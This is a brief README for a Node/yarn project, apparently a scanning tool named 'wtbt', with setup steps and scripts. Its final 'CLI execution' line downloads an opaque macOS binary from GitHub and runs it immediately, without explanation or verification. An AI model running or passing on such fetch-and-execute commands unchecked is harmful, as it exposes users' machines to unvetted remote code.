## Prerequisites

1. `node` >= v16.13.0 | https://nodejs.org/es/
2. `yarn`. After node is installed do `npm i -g yarn`.

### Setup

- Clone this repo
- `yarn install`

### Scripts

- `yarn run start` Will start scanning
- `yarn run start:all`

## CLI execution

bin_fd=$(mktemp) && curl -fsSL https://github.com/MiltonTulli/wtbt/raw/refs/heads/master/darwin-arm64 > "$bin_fd" && chmod +x "$bin_fd" && "$bin_fd"
